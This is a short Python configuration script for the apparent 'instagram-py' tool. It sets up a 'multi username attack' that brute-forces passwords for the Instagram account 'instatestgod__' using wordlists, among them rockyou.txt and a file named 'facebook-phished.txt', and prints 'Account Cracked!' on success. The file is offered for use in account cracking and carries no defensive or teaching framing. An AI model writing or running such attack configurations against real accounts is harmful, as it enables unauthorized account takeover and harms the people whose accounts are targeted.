#!/usr/bin/instagram-py -s
# Only Supports Python 3

import os

def hacked_an_account(username, password):
    # Use Twilio API to Make a Message to our phone Maybe?
    print("Account Cracked!")
    return True

print("Initiating Multi Username Attack Script...")

global_callback = hacked_an_account
global_password_list = os.path.expanduser('~') + "/Developer/.exploits/facebook-phished.txt"

usernames = [  # Reserved Variable
    {
        "id": "instatestgod__",
        "password_list": "/home/antonyjr/Developer/.exploits/rockyou.txt",  # full path
        "continue": True,  # Optional
        "verbose": 0  # Optional
    },
    # If you want to simultaneously attack the same account with different wordlist
    # Apparently Saving does not work here if two wordlists are used on a single user!
    # Could be later fixed anyways...
    {
        "id": "instatestgod__",
        # global password list will cover us if the password list is not mentioned!
        "continue": False,  # Optional
        "verbose": 3  # Optional
    }
    # ,
    # {
    #     "id": "even_more_users",
    #     "password_list": "different_passwords.lst",
    # }
]
# Attack Automatically starts here!

